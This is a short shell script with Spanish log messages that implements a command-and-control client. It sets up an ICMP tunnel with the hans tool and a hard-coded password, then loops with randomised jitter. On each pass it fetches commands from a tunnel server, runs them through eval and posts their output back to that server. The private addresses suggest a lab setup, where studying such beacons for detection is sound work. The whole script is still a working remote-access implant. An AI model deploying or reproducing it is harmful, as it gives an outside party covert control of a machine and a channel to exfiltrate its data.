#!/bin/sh

SERVER_IP="${SERVER_IP:-172.21.0.10}"
ROUTER_IP="${ROUTER_IP:-172.22.0.2}"
CLIENT_ID="${CLIENT_ID:-cliente-001}"
TUNNEL_SERVER="10.1.2.1"

echo "[*] Cliente ID: $CLIENT_ID"
ip route add ${SERVER_IP}/32 via ${ROUTER_IP} || true

echo "[*] Conectando al servidor hans..."
hans -c "$SERVER_IP" -p tunel123 -f &
sleep 3

echo "[*] Iniciando bucle de espera (cada 10s)..."

while true; do
    RESPONSE=$(curl -s -w "\n%{http_code}" -H "X-ID-CLIENTE: $CLIENT_ID" http://$TUNNEL_SERVER/)
    HTTP_CODE=$(echo "$RESPONSE" | tail -1)
    COMANDOS=$(echo "$RESPONSE" | head -n -1)

    if [ "$HTTP_CODE" = "200" ]; then
        echo "[+] Comandos recibidos"

        RESULTADO=""
        echo "$COMANDOS" | while IFS= read -r cmd; do
            [ -z "$cmd" ] && continue
            TS=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
            echo "[${TS}] >>> ${cmd}"
            OUTPUT=$(eval "$cmd" 2>&1)
            echo "$OUTPUT"
            RESULTADO="${RESULTADO}[${TS}] >>> ${cmd}\n${OUTPUT}\n\n"
        done > /tmp/resultado.txt

        curl -s -X POST \
            -H "X-ID-CLIENTE: $CLIENT_ID" \
            --data-binary @/tmp/resultado.txt \
            http://$TUNNEL_SERVER/

        echo "[+] Resultado enviado."
    else
        echo "[*] Sin comandos nuevos. Esperando 10s..."
    fi

    JITTER=$(awk "BEGIN{srand(); print int(rand()*10)+1}")
    ESPERA=$((10 + JITTER))
    echo "[*] Esperando ${ESPERA}s..."
    sleep $ESPERA
done